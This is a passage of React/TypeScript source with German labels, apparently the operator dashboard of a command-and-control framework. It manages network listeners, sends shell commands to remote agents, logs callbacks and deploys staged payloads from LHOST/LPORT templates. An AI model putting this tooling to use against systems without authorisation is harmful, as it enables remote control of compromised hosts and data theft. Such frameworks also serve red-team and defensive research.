import { useEffect, useState, useCallback } from 'react';
import {
  Radio, Copy, Check, RefreshCw, Wifi, Database, Play, Square, RotateCcw,
  Plus, Trash2, Globe, Terminal, Signal, X, AlertTriangle,
  ChevronDown, ChevronRight, Send, Zap, Cpu, FileCode, Eye, EyeOff, Download,
} from 'lucide-react';
import api from '../api/client';
import {
  type ListenerItem, type ListenerProfile, type CallbackItem, type StagedPayloadItem,
  type AgentItem, type AgentTaskItem, type PayloadTemplate, type RenderedPayload,
  getListeners, createListener, deleteListener, startListener, stopListener, restartListener,
  getProfiles, createProfile, deleteProfile,
  getCallbacks, deleteCallbacks,
  getStagedPayloads, createStagedPayload, deleteStagedPayload,
  getAgents, getAgent, deleteAgent, createAgentTask,
  killAgent, refreshAgentStatus, getAgentStats,
  getTemplates, renderTemplate, createStagedFromTemplate,
} from '../api/listeners';

/* ── Legacy types ──────────────────────────────────────────────────────── */
interface LegacyEvent { id: number; action: 'payload_checkin' | 'data_exfil'; target: string; details: string; ip_address: string; timestamp: string; }
interface LegacyEventsResponse { events: LegacyEvent[]; total: number; pages: number; current_page: number; }

/* ── Tabs ──────────────────────────────────────────────────────────────── */
type Tab = 'listeners' | 'agents' | 'callbacks' | 'staged' | 'legacy';
const TABS: { key: Tab; label: string; Icon: React.ElementType }[] = [
  { key: 'listeners', label: 'Listeners', Icon: Radio },
  { key: 'agents', label: 'Agents', Icon: Cpu },
  { key: 'callbacks', label: 'Callbacks', Icon: Signal },
  { key: 'staged', label: 'Staged Payloads', Icon: Zap },
  { key: 'legacy', label: 'Legacy Events', Icon: Database },
];

const STATUS_COLORS: Record<string, string> = {
  running: 'bg-emerald-400/15 text-emerald-400 border-emerald-400/30',
  stopped: 'bg-slate-600/20 text-slate-400 border-slate-500/30',
  error: 'bg-rose-400/15 text-rose-400 border-rose-400/30',
  starting: 'bg-amber-400/15 text-amber-400 border-amber-400/30',
  active: 'bg-emerald-400/15 text-emerald-400 border-emerald-400/30',
  dormant: 'bg-amber-400/15 text-amber-400 border-amber-400/30',
  dead: 'bg-slate-600/20 text-slate-500 border-slate-500/30',
  disconnected: 'bg-rose-400/15 text-rose-400 border-rose-400/30',
};

function StatusBadge({ status }: { status: string }) {
  return <span className={`px-2 py-0.5 rounded text-xs font-medium border ${STATUS_COLORS[status] ?? 'bg-slate-700 text-slate-300'}`}>{status}</span>;
}

function CopyBtn({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  return (
    <button onClick={() => { navigator.clipboard.writeText(text); setCopied(true); setTimeout(() => setCopied(false), 1500); }} className="p-1 rounded hover:bg-white/10 transition-colors">
      {copied ? <Check size={12} className="text-emerald-400" /> : <Copy size={12} className="text-slate-500" />}
    </button>
  );
}

/* ═══════════════════════════════════════════════════════════════════════════
   Listeners Tab
   ═══════════════════════════════════════════════════════════════════════ */

function ListenersTab() {
  const [listeners, setListeners] = useState<ListenerItem[]>([]);
  const [profiles, setProfiles] = useState<ListenerProfile[]>([]);
  const [loading, setLoading] = useState(false);
  const [showCreate, setShowCreate] = useState(false);
  const [form, setForm] = useState({ 
    name: '', 
    bind_port: 8080, 
    listener_type: 'http', 
    bind_address: '0.0.0.0', 
    profile_id: null as number | null,
    options: {} as Record<string, any>
  });
  const [error, setError] = useState<string | null>(null);

  const refresh = useCallback(async () => {
    setLoading(true);
    try { const [lr, pr] = await Promise.all([getListeners(), getProfiles()]); setListeners(Array.isArray(lr.data) ? lr.data : []); setProfiles(Array.isArray(pr.data) ? pr.data : []); }
    catch { setError('Fehler beim Laden'); }
    finally { setLoading(false); }
  }, []);

  useEffect(() => { refresh(); const i = setInterval(refresh, 8000); return () => clearInterval(i); }, [refresh]);

  const handleCreate = async () => {
    try {
      await createListener({ ...form, profile_id: form.profile_id || undefined });
      setShowCreate(false); setForm({ name: '', bind_port: 8080, listener_type: 'http', bind_address: '0.0.0.0', profile_id: null, options: {} }); refresh();
    } catch (e: any) { setError(e.response?.data?.error || 'Erstellen fehlgeschlagen'); }
  };

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          <span className="text-sm text-slate-400">{listeners.length} Listener konfiguriert</span>
          <button onClick={refresh} className="p-1 rounded hover:bg-slate-700"><RefreshCw size={14} className={loading ? 'animate-spin text-slate-400' : 'text-slate-500'} /></button>
        </div>
        <button onClick={() => setShowCreate(!showCreate)} className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-indigo-600 hover:bg-indigo-500 text-white text-sm font-medium"><Plus size={14} /> Neuer Listener</button>
      </div>

      {error && <div className="text-rose-400 text-sm bg-rose-400/10 border border-rose-400/20 rounded-lg px-4 py-2">{error} <button onClick={() => setError(null)} className="ml-2 text-slate-400 hover:text-white"><X size={12} /></button></div>}

      {showCreate && (
        <div className="bg-slate-800 border border-slate-700 rounded-xl p-5 space-y-4">
          <h3 className="text-white font-semibold text-sm">Neuen Listener erstellen</h3>
          <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
            <div className="space-y-1">
              <label className="text-[10px] text-slate-500 uppercase font-bold ml-1">Name</label>
              <input className="bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white placeholder-slate-500 w-full" placeholder="Name" value={form.name} onChange={e => setForm({ ...form, name: e.target.value })} />
            </div>
            <div className="space-y-1">
              <label className="text-[10px] text-slate-500 uppercase font-bold ml-1">Port</label>
              <input className="bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white placeholder-slate-500 w-full" type="number" placeholder="Port" value={form.bind_port} onChange={e => setForm({ ...form, bind_port: parseInt(e.target.value) || 0 })} />
            </div>
            <div className="space-y-1">
              <label className="text-[10px] text-slate-500 uppercase font-bold ml-1">Typ</label>
              <select className="bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white w-full" value={form.listener_type} onChange={e => setForm({ ...form, listener_type: e.target.value, options: {} })}>
                <option value="http">HTTP</option>
                <option value="https">HTTPS</option>
                <option value="ssh">SSH</option>
                <option value="smb">SMB</option>
                <option value="dns">DNS</option>
              </select>
            </div>
            <div className="space-y-1">
              <label className="text-[10px] text-slate-500 uppercase font-bold ml-1">Profil</label>
              <select className="bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white w-full" value={form.profile_id ?? ''} onChange={e => setForm({ ...form, profile_id: e.target.value ? parseInt(e.target.value) : null })}>
                <option value="">Kein Profil</option>
                {profiles.map(p => <option key={p.id} value={p.id}>{p.name}</option>)}
              </select>
            </div>
          </div>
          
          <div className="space-y-1">
            <label className="text-[10px] text-slate-500 uppercase font-bold ml-1">Bind Address</label>
            <input className="bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white placeholder-slate-500 w-full" placeholder="Bind Address (0.0.0.0)" value={form.bind_address} onChange={e => setForm({ ...form, bind_address: e.target.value })} />
          </div>

          {/* Dynamic Configuration Panel based on Listener Type */}
          <div className="bg-slate-900/50 border border-slate-700/50 rounded-lg p-4 space-y-3">
            <h4 className="text-xs font-bold text-slate-400 uppercase tracking-wider">{form.listener_type.toUpperCase()} Konfiguration</h4>
            
            {form.listener_type === 'ssh' && (
              <div className="grid grid-cols-2 gap-3">
                <input className="bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white placeholder-slate-500" placeholder="SSH Banner" value={form.options.banner || ''} onChange={e => setForm({ ...form, options: { ...form.options, banner: e.target.value } })} />
                <input className="bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white placeholder-slate-500" placeholder="Private Key Path" value={form.options.key_path || ''} onChange={e => setForm({ ...form, options: { ...form.options, key_path: e.target.value } })} />
              </div>
            )}

            {form.listener_type === 'dns' && (
              <div className="grid grid-cols-2 gap-3">
                <input className="bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white placeholder-slate-500" placeholder="Zone (z.B. c2.example.com)" value={form.options.zone || ''} onChange={e => setForm({ ...form, options: { ...form.options, zone: e.target.value } })} />
                <input className="bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white placeholder-slate-500" type="number" placeholder="TTL" value={form.options.ttl || 60} onChange={e => setForm({ ...form, options: { ...form.options, ttl: parseInt(e.target.value) } })} />
              </div>
            )}

            {form.listener_type === 'smb' && (
              <div className="grid grid-cols-2 gap-3">
                <input className="bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white placeholder-slate-500" placeholder="Pipe Name" value={form.options.pipe_name || 'c2_pipe'} onChange={e => setForm({ ...form, options: { ...form.options, pipe_name: e.target.value } })} />
                <input className="bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white placeholder-slate-500" placeholder="Share Name" value={form.options.share_name || ''} onChange={e => setForm({ ...form, options: { ...form.options, share_name: e.target.value } })} />
              </div>
            )}

            {(form.listener_type === 'http' || form.listener_type === 'https') && (
              <div className="text-xs text-slate-500 italic">Verwendet das ausgewählte Profil für erweiterte HTTP-Einstellungen.</div>
            )}
            
            {form.listener_type === 'https' && (
              <div className="grid grid-cols-2 gap-3 pt-2">
                <input className="bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white placeholder-slate-500" placeholder="Cert Path" value={form.options.tls_cert_path || ''} onChange={e => setForm({ ...form, options: { ...form.options, tls_cert_path: e.target.value } })} />
                <input className="bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white placeholder-slate-500" placeholder="Key Path" value={form.options.tls_key_path || ''} onChange={e => setForm({ ...form, options: { ...form.options, tls_key_path: e.target.value } })} />
              </div>
            )}
          </div>

          <div className="flex justify-end gap-2">
            <button onClick={() => setShowCreate(false)} className="px-3 py-1.5 rounded-lg bg-slate-700 hover:bg-slate-600 text-slate-300 text-sm">Abbrechen</button>
            <button onClick={handleCreate} className="px-3 py-1.5 rounded-lg bg-indigo-600 hover:bg-indigo-500 text-white text-sm font-medium">Erstellen</button>
          </div>
        </div>
      )}

      {listeners.length === 0 && !loading && <div className="text-center py-12 text-slate-500">Keine Listener konfiguriert.</div>}
      <div className="space-y-3">
        {listeners.map(lsn => <ListenerCard key={lsn.id} listener={lsn} onRefresh={refresh} profiles={profiles} />)}
      </div>
    </div>
  );
}

function ListenerCard({ listener: lsn, onRefresh, profiles }: { listener: ListenerItem; onRefresh: () => void; profiles: ListenerProfile[] }) {
  const [expanded, setExpanded] = useState(false);
  const [busy, setBusy] = useState(false);
  const action = async (fn: () => Promise<any>) => { setBusy(true); try { await fn(); onRefresh(); } catch (e: any) { alert(e.response?.data?.error || 'Fehler'); } finally { setBusy(false); } };
  const prof = profiles.find(p => p.id === lsn.profile_id);

  return (
    <div className="bg-slate-800/60 border border-slate-700 rounded-xl overflow-hidden">
      <div className="flex items-center justify-between px-5 py-3">
        <div className="flex items-center gap-3 cursor-pointer" onClick={() => setExpanded(!expanded)}>
          {expanded ? <ChevronDown size={14} className="text-slate-500" /> : <ChevronRight size={14} className="text-slate-500" />}
          <Globe size={16} className="text-indigo-400" />
          <span className="text-white font-medium text-sm">{lsn.name}</span>
          <StatusBadge status={lsn.status} />
          <span className="text-slate-500 text-xs font-mono">{lsn.bind_address}:{lsn.bind_port}</span>
          <span className="text-slate-600 text-xs">{lsn.listener_type.toUpperCase()}</span>
          {prof && <span className="text-slate-600 text-xs">· {prof.name}</span>}
        </div>
        <div className="flex items-center gap-1.5">
          <span className="text-xs text-slate-500 mr-2">{lsn.callback_count} CBs · {lsn.agent_count} Agents · {lsn.staged_count} Staged</span>
          {lsn.status === 'stopped' || lsn.status === 'error'
            ? <button onClick={() => action(() => startListener(lsn.id))} disabled={busy} className="p-1.5 rounded hover:bg-emerald-500/20 text-emerald-400 disabled:opacity-40" title="Start"><Play size={14} /></button>
            : <button onClick={() => action(() => stopListener(lsn.id))} disabled={busy} className="p-1.5 rounded hover:bg-rose-500/20 text-rose-400 disabled:opacity-40" title="Stop"><Square size={14} /></button>}
          {lsn.status === 'running' && <button onClick={() => action(() => restartListener(lsn.id))} disabled={busy} className="p-1.5 rounded hover:bg-amber-500/20 text-amber-400 disabled:opacity-40" title="Restart"><RotateCcw size={14} /></button>}
          {lsn.status !== 'running' && <button onClick={() => { if (confirm('Listener löschen?')) action(() => deleteListener(lsn.id)); }} disabled={busy} className="p-1.5 rounded hover:bg-rose-500/20 text-rose-400 disabled:opacity-40" title="Löschen"><Trash2 size={14} /></button>}
        </div>
      </div>
      {expanded && (
        <div className="border-t border-slate-700 px-5 py-3 text-xs text-slate-400 space-y-1">
          {lsn.error_message && <p className="text-rose-400"><AlertTriangle size={12} className="inline mr-1" />{lsn.error_message}</p>}
          <p>Erstellt: {new Date(lsn.created_at).toLocaleString()}</p>
          {lsn.last_started_at && <p>Zuletzt gestartet: {new Date(lsn.last_started_at).toLocaleString()}</p>}
          {lsn.last_stopped_at && <p>Zuletzt gestoppt: {new Date(lsn.last_stopped_at).toLocaleString()}</p>}
          {lsn.runtime?.running && <p className="text-emerald-400">Thread aktiv: {lsn.runtime.thread_name}</p>}
        </div>
      )}
    </div>
  );
}

/* ═══════════════════════════════════════════════════════════════════════════
   Agents Tab
   ═══════════════════════════════════════════════════════════════════════ */

function AgentsTab() {
  const [agents, setAgents] = useState<AgentItem[]>([]);
  const [total, setTotal] = useState(0);
  const [selectedAgent, setSelectedAgent] = useState<string | null>(null);
  const [agentDetail, setAgentDetail] = useState<(AgentItem & { recent_tasks: AgentTaskItem[] }) | null>(null);
  const [command, setCommand] = useState('');
  const [loading, setLoading] = useState(false);
  const [stats, setStats] = useState<{ total_agents: number; active: number; dormant: number; dead: number } | null>(null);

  const refresh = useCallback(async () => {
    setLoading(true);
    try { const [ar, sr] = await Promise.all([getAgents({ per_page: 100 }), getAgentStats()]); setAgents(ar.data.agents); setTotal(ar.data.total); setStats(sr.data); }
    catch { /* ignore */ }
    finally { setLoading(false); }
  }, []);

  useEffect(() => { refresh(); const i = setInterval(refresh, 6000); return () => clearInterval(i); }, [refresh]);

  const selectAgent = async (id: string) => {
    setSelectedAgent(id);
    try { const res = await getAgent(id); setAgentDetail(res.data); } catch { /* ignore */ }
  };

  const sendCommand = async () => {
    if (!selectedAgent || !command.trim()) return;
    try { await createAgentTask(selectedAgent, { command: command.trim() }); setCommand(''); selectAgent(selectedAgent); } catch { /* ignore */ }
  };

  return (
    <div className="space-y-4">
      {stats && (
        <div className="grid grid-cols-4 gap-3">
          {([
            { label: 'Gesamt', value: stats.total_agents, color: 'text-white' },
            { label: 'Aktiv', value: stats.active, color: 'text-emerald-400' },
            { label: 'Schlafend', value: stats.dormant, color: 'text-amber-400' },
            { label: 'Tot', value: stats.dead, color: 'text-slate-500' },
          ] as const).map(s => (
            <div key={s.label} className="bg-slate-800/60 border border-slate-700 rounded-lg px-4 py-3 text-center">
              <div className={`text-xl font-bold ${s.color}`}>{s.value}</div>
              <div className="text-xs text-slate-500">{s.label}</div>
            </div>
          ))}
        </div>
      )}

      <div className="flex items-center gap-2">
        <button onClick={refresh} className="p-1 rounded hover:bg-slate-700"><RefreshCw size={14} className={loading ? 'animate-spin text-slate-400' : 'text-slate-500'} /></button>
        <button onClick={async () => { await refreshAgentStatus(); refresh(); }} className="text-xs text-slate-400 hover:text-white px-2 py-1 rounded bg-slate-800 border border-slate-700">Status aktualisieren</button>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
        {/* Agent list */}
        <div className="bg-slate-800/60 border border-slate-700 rounded-xl overflow-hidden">
          <div className="px-4 py-3 border-b border-slate-700"><h3 className="text-white font-semibold text-sm">Agents ({total})</h3></div>
          {agents.length === 0
            ? <div className="px-4 py-8 text-center text-slate-500 text-sm">Keine Agents registriert.</div>
            : (
              <div className="divide-y divide-slate-700/50 max-h-[500px] overflow-y-auto">
                {agents.map(a => (
                  <div key={a.id} onClick={() => selectAgent(a.id)} className={`px-4 py-3 cursor-pointer hover:bg-slate-700/30 transition-colors ${selectedAgent === a.id ? 'bg-indigo-600/10 border-l-2 border-indigo-500' : ''}`}>
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-2"><Cpu size={14} className="text-indigo-400" /><span className="text-white text-sm font-medium">{a.hostname || 'Unknown'}</span><StatusBadge status={a.status} /></div>
                      <span className="text-xs text-slate-500 font-mono">{a.external_ip}</span>
                    </div>
                    <div className="flex items-center gap-3 mt-1 text-xs text-slate-500">
                      <span>{a.username}</span><span>{a.os_info?.substring(0, 30)}</span>
                      {a.last_seen && <span>Zuletzt: {new Date(a.last_seen).toLocaleTimeString()}</span>}
                    </div>
                  </div>
                ))}
              </div>
            )}
        </div>

        {/* Agent detail / interaction */}
        <div className="bg-slate-800/60 border border-slate-700 rounded-xl overflow-hidden">
          {!agentDetail
            ? <div className="px-4 py-12 text-center text-slate-500 text-sm">Agent auswählen für Details und Interaktion</div>
            : (
              <>
                <div className="px-4 py-3 border-b border-slate-700 flex items-center justify-between">
                  <div><h3 className="text-white font-semibold text-sm">{agentDetail.hostname}</h3><p className="text-xs text-slate-500">{agentDetail.username} · {agentDetail.os_info}</p></div>
                  <div className="flex items-center gap-1">
                    <button onClick={() => { if (confirm('Agent killen?')) killAgent(agentDetail.id).then(refresh); }} className="p-1.5 rounded hover:bg-rose-500/20 text-rose-400" title="Kill"><X size={14} /></button>
                    <button onClick={() => { if (confirm('Agent löschen?')) deleteAgent(agentDetail.id).then(() => { setSelectedAgent(null); setAgentDetail(null); refresh(); }); }} className="p-1.5 rounded hover:bg-rose-500/20 text-rose-400" title="Löschen"><Trash2 size={14} /></button>
                  </div>
                </div>
                <div className="px-4 py-3 border-b border-slate-700 grid grid-cols-2 gap-2 text-xs">
                  <div><span className="text-slate-500">ID:</span> <span className="text-slate-300 font-mono">{agentDetail.id.substring(0, 8)}...</span><CopyBtn text={agentDetail.id} /></div>
                  <div><span className="text-slate-500">Int. IP:</span> <span className="text-slate-300 font-mono">{agentDetail.internal_ip}</span></div>
                  <div><span className="text-slate-500">Ext. IP:</span> <span className="text-slate-300 font-mono">{agentDetail.external_ip}</span></div>
                  <div><span className="text-slate-500">Sleep:</span> <span className="text-slate-300">{agentDetail.sleep_interval}s / Jitter {agentDetail.jitter}%</span></div>
                  <div><span className="text-slate-500">Erste Verbindung:</span> <span className="text-slate-300">{agentDetail.first_seen ? new Date(agentDetail.first_seen).toLocaleString() : 'n/a'}</span></div>
                  <div><span className="text-slate-500">Zuletzt gesehen:</span> <span className="text-slate-300">{agentDetail.last_seen ? new Date(agentDetail.last_seen).toLocaleString() : 'n/a'}</span></div>
                </div>
                <div className="px-4 py-3 border-b border-slate-700">
                  <div className="flex gap-2">
                    <div className="flex-1 flex items-center bg-slate-900 border border-slate-700 rounded-lg px-3">
                      <Terminal size={14} className="text-slate-500 mr-2" />
                      <input className="bg-transparent border-none outline-none text-sm text-white flex-1 py-2 placeholder-slate-500" placeholder="Befehl eingeben..." value={command} onChange={e => setCommand(e.target.value)} onKeyDown={e => e.key === 'Enter' && sendCommand()} />
                    </div>
                    <button onClick={sendCommand} disabled={!command.trim()} className="px-3 py-2 rounded-lg bg-indigo-600 hover:bg-indigo-500 text-white disabled:opacity-40"><Send size={14} /></button>
                  </div>
                </div>
                <div className="max-h-[300px] overflow-y-auto">
                  {agentDetail.recent_tasks.length === 0
                    ? <div className="px-4 py-6 text-center text-slate-500 text-sm">Keine Tasks</div>
                    : (
                      <div className="divide-y divide-slate-700/50">
                        {agentDetail.recent_tasks.map(t => (
                          <div key={t.id} className="px-4 py-3">
                            <div className="flex items-center justify-between">
                              <code className="text-xs text-indigo-300 font-mono">{t.command.substring(0, 60)}{t.command.length > 60 ? '...' : ''}</code>
                              <StatusBadge status={t.status} />
                            </div>
                            {t.result && <pre className="mt-2 text-xs text-slate-400 bg-slate-900/60 rounded p-2 max-h-[120px] overflow-auto whitespace-pre-wrap">{t.result}</pre>}
                            <div className="text-[10px] text-slate-600 mt-1">{new Date(t.created_at).toLocaleString()}</div>
                          </div>
                        ))}
                      </div>
                    )}
                </div>
              </>
            )}
        </div>
      </div>
    </div>
  );
}

/* ═══════════════════════════════════════════════════════════════════════════
   Callbacks Tab
   ═══════════════════════════════════════════════════════════════════════ */

function CallbacksTab() {
  const [callbacks, setCallbacks] = useState<CallbackItem[]>([]);
  const [total, setTotal] = useState(0);
  const [page, setPage] = useState(1);
  const [pages, setPages] = useState(1);
  const [loading, setLoading] = useState(false);
  const [selected, setSelected] = useState<CallbackItem | null>(null);

  const refresh = useCallback(async (p = 1) => {
    setLoading(true);
    try { const res = await getCallbacks({ page: p, per_page: 50 }); setCallbacks(res.data.callbacks); setTotal(res.data.total); setPages(res.data.pages); setPage(res.data.current_page); }
    catch { /* ignore */ }
    finally { setLoading(false); }
  }, []);

  useEffect(() => { refresh(); const i = setInterval(() => refresh(), 8000); return () => clearInterval(i); }, [refresh]);

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between">
        <span className="text-sm text-slate-400">{total} Callbacks gesamt</span>
        <div className="flex items-center gap-2">
          <button onClick={() => { if (confirm('Alle Callbacks löschen?')) deleteCallbacks().then(() => refresh()); }} className="text-xs text-rose-400 hover:text-rose-300 px-2 py-1 rounded bg-slate-800 border border-slate-700">Alle löschen</button>
          <button onClick={() => refresh(page)} className="p-1 rounded hover:bg-slate-700"><RefreshCw size={14} className={loading ? 'animate-spin text-slate-400' : 'text-slate-500'} /></button>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
        <div className="lg:col-span-2 bg-slate-800/60 border border-slate-700 rounded-xl overflow-hidden">
          {callbacks.length === 0 ? <div className="px-4 py-8 text-center text-slate-500 text-sm">Keine Callbacks.</div> : (
            <div className="overflow-x-auto">
              <table className="w-full text-xs">
                <thead><tr className="text-left text-slate-500 border-b border-slate-700"><th className="px-4 py-2">Methode</th><th className="px-4 py-2">Pfad</th><th className="px-4 py-2">IP</th><th className="px-4 py-2">Listener</th><th className="px-4 py-2">Zeit</th></tr></thead>
                <tbody>
                  {callbacks.map(cb => (
                    <tr key={cb.id} onClick={() => setSelected(cb)} className={`border-b border-slate-700/30 cursor-pointer hover:bg-slate-700/30 ${selected?.id === cb.id ? 'bg-indigo-600/10' : ''}`}>
                      <td className="px-4 py-2"><span className="px-1.5 py-0.5 rounded bg-slate-700 text-slate-300">{cb.request_method}</span></td>
                      <td className="px-4 py-2 text-slate-300 font-mono max-w-[200px] truncate">{cb.request_path}</td>
                      <td className="px-4 py-2 text-slate-400 font-mono">{cb.source_ip}</td>
                      <td className="px-4 py-2 text-slate-500">#{cb.listener_id}</td>
                      <td className="px-4 py-2 text-slate-500 whitespace-nowrap">{new Date(cb.timestamp).toLocaleTimeString()}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
          {pages > 1 && (
            <div className="flex items-center justify-center gap-2 py-3 border-t border-slate-700">
              <button disabled={page <= 1} onClick={() => refresh(page - 1)} className="px-2 py-1 rounded bg-slate-700 text-slate-300 text-xs disabled:opacity-40">←</button>
              <span className="text-xs text-slate-500">{page}/{pages}</span>
              <button disabled={page >= pages} onClick={() => refresh(page + 1)} className="px-2 py-1 rounded bg-slate-700 text-slate-300 text-xs disabled:opacity-40">→</button>
            </div>
          )}
        </div>

        <div className="bg-slate-800/60 border border-slate-700 rounded-xl overflow-hidden">
          {!selected ? <div className="px-4 py-8 text-center text-slate-500 text-sm">Callback auswählen</div> : (
            <div className="p-4 space-y-3 text-xs">
              <h3 className="text-white font-semibold text-sm">Callback #{selected.id}</h3>
              <div><span className="text-slate-500">Methode:</span> <span className="text-white">{selected.request_method}</span></div>
              <div><span className="text-slate-500">Pfad:</span> <span className="text-slate-300 font-mono break-all">{selected.request_path}</span></div>
              <div><span className="text-slate-500">IP:</span> <span className="text-slate-300 font-mono">{selected.source_ip}</span></div>
              <div><span className="text-slate-500">User-Agent:</span> <span className="text-slate-400 break-all">{selected.user_agent}</span></div>
              <div><span className="text-slate-500">Zeit:</span> <span className="text-slate-300">{new Date(selected.timestamp).toLocaleString()}</span></div>
              {selected.request_body && <div><span className="text-slate-500">Body:</span><pre className="mt-1 bg-slate-900/60 rounded p-2 text-slate-400 max-h-[150px] overflow-auto whitespace-pre-wrap">{selected.request_body}</pre></div>}
              {selected.request_headers && <div><span className="text-slate-500">Headers:</span><pre className="mt-1 bg-slate-900/60 rounded p-2 text-slate-400 max-h-[150px] overflow-auto whitespace-pre-wrap">{JSON.stringify(selected.request_headers, null, 2)}</pre></div>}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

/* ═══════════════════════════════════════════════════════════════════════════
   Staged Payloads Tab
   ═══════════════════════════════════════════════════════════════════════ */

function StagedTab() {
  const [listeners, setListeners] = useState<ListenerItem[]>([]);
  const [selectedLid, setSelectedLid] = useState<number | null>(null);
  const [payloads, setPayloads] = useState<StagedPayloadItem[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  // Template generation state
  const [templates, setTemplates] = useState<PayloadTemplate[]>([]);
  const [showGenerator, setShowGenerator] = useState(false);
  const [showManual, setShowManual] = useState(false);
  const [selectedTemplate, setSelectedTemplate] = useState<string>('');
  const [tplParams, setTplParams] = useState<Record<string, string>>({ LHOST: '', LPORT: '', SLEEP: '5', JITTER: '10', STAGE_PATH: '' });
  const [preview, setPreview] = useState<RenderedPayload | null>(null);
  const [previewVisible, setPreviewVisible] = useState(false);
  const [generating, setGenerating] = useState(false);

  // Manual create form
  const [manualForm, setManualForm] = useState({ name: '', stage_path: '/', content: '', payload_type: 'raw' });

  const selectedListener = listeners.find(l => l.id === selectedLid);

  useEffect(() => {
    Promise.all([getListeners(), getTemplates()])
      .then(([lr, tr]) => {
        const lst = Array.isArray(lr.data) ? lr.data : [];
        setListeners(lst);
        if (lst.length > 0) setSelectedLid(lst[0].id);
        setTemplates(Array.isArray(tr.data) ? tr.data : []);
      })
      .catch(() => {});
  }, []);

  useEffect(() => {
    if (selectedLid) {
      setLoading(true);
      getStagedPayloads(selectedLid).then(r => setPayloads(Array.isArray(r.data) ? r.data : [])).catch(() => {}).finally(() => setLoading(false));
    }
  }, [selectedLid]);

  // Auto-fill LHOST/LPORT from selected listener
  useEffect(() => {
    if (selectedListener) {
      setTplParams(prev => ({
        ...prev,
        LHOST: prev.LHOST || (selectedListener.bind_address !== '0.0.0.0' ? selectedListener.bind_address : ''),
        LPORT: prev.LPORT || String(selectedListener.bind_port),
      }));
    }
  }, [selectedLid]);

  const refreshPayloads = () => {
    if (selectedLid) getStagedPayloads(selectedLid).then(r => setPayloads(Array.isArray(r.data) ? r.data : [])).catch(() => {});
  };

  const handleTemplateSelect = (id: string) => {
    setSelectedTemplate(id);
    setPreview(null);
    setPreviewVisible(false);
    const tpl = templates.find(t => t.id === id);
    if (tpl && selectedListener) {
      setTplParams(prev => ({
        ...prev,
        STAGE_PATH: tpl.default_stage_path,
        LPORT: String(selectedListener.bind_port),
      }));
    }
  };

  const handlePreview = async () => {
    if (!selectedTemplate) return;
    setGenerating(true);
    try {
      const res = await renderTemplate(selectedTemplate, tplParams);
      setPreview(res.data);
      setPreviewVisible(true);
    } catch (e: any) {
      setError(e.response?.data?.error || 'Vorschau fehlgeschlagen');
    } finally {
      setGenerating(false);
    }
  };

  const handleDeploy = async () => {
    if (!selectedLid || !selectedTemplate) return;
    setGenerating(true);
    setError(null);
    try {
      await createStagedFromTemplate(selectedLid, {
        template_id: selectedTemplate,
        ...tplParams,
        LPORT: parseInt(tplParams.LPORT) || 80,
        SLEEP: parseInt(tplParams.SLEEP) || 5,
        JITTER: parseInt(tplParams.JITTER) || 10,
        stage_path: tplParams.STAGE_PATH,
      });
      setShowGenerator(false);
      setSelectedTemplate('');
      setPreview(null);
      setPreviewVisible(false);
      refreshPayloads();
    } catch (e: any) {
      setError(e.response?.data?.error || 'Deployment fehlgeschlagen');
    } finally {
      setGenerating(false);
    }
  };

  const handleManualCreate = async () => {
    if (!selectedLid) return;
    try {
      await createStagedPayload(selectedLid, manualForm);
      setShowManual(false);
      setManualForm({ name: '', stage_path: '/', content: '', payload_type: 'raw' });
      refreshPayloads();
    } catch (e: any) {
      setError(e.response?.data?.error || 'Fehler');
    }
  };

  const curTpl = templates.find(t => t.id === selectedTemplate);

  const PLATFORM_COLORS: Record<string, string> = {
    windows: 'text-blue-400 bg-blue-400/10 border-blue-400/30',
    linux: 'text-orange-400 bg-orange-400/10 border-orange-400/30',
    'cross-platform': 'text-purple-400 bg-purple-400/10 border-purple-400/30',
  };

  return (
    <div className="space-y-4">
      {error && <div className="text-rose-400 text-sm bg-rose-400/10 border border-rose-400/20 rounded-lg px-4 py-2">{error} <button onClick={() => setError(null)} className="ml-2 text-slate-400 hover:text-white"><X size={12} /></button></div>}

      {/* Listener selector + action buttons */}
      <div className="flex items-center justify-between flex-wrap gap-3">
        <div className="flex items-center gap-3">
          <select className="bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white" value={selectedLid ?? ''} onChange={e => setSelectedLid(parseInt(e.target.value) || null)}>
            <option value="">Listener wählen...</option>
            {listeners.map(l => <option key={l.id} value={l.id}>{l.name} (:{l.bind_port}) {l.status === 'running' ? '●' : '○'}</option>)}
          </select>
          <button onClick={refreshPayloads} className="p-1 rounded hover:bg-slate-700"><RefreshCw size={14} className={loading ? 'animate-spin text-slate-400' : 'text-slate-500'} /></button>
        </div>
        {selectedLid && (
          <div className="flex items-center gap-2">
            <button onClick={() => { setShowGenerator(!showGenerator); setShowManual(false); }} className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-indigo-600 hover:bg-indigo-500 text-white text-sm font-medium">
              <Zap size={14} /> Aus Template generieren
            </button>
